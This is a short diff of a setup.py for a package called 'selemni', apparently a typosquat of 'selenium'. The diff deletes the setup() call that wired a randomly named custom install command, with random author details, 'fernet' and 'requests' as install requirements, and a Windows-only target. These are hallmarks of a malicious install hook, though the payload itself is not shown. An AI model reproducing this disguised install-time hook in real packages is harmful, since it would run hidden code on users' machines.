@@ -18,22 +18,5 @@ class zURqvcopFQcCUtqnEsysbsgOgjJYFUMmQojMMVencPyDgYfLdPRANKLPqdcdArNkEAmZzKBian
             install.run(self)
 
 
-setup(
-    name="selemni",
-    version=VERSION,
-    author="sNauGxiPgw",
-    author_email="WYnrKwbSMNBkPsBY@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': zURqvcopFQcCUtqnEsysbsgOgjJYFUMmQojMMVencPyDgYfLdPRANKLPqdcdArNkEAmZzKBianfUrFVPsbOwollRozPKKGrylSjKEpRXcqpUtovLILpBfRCNhh,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
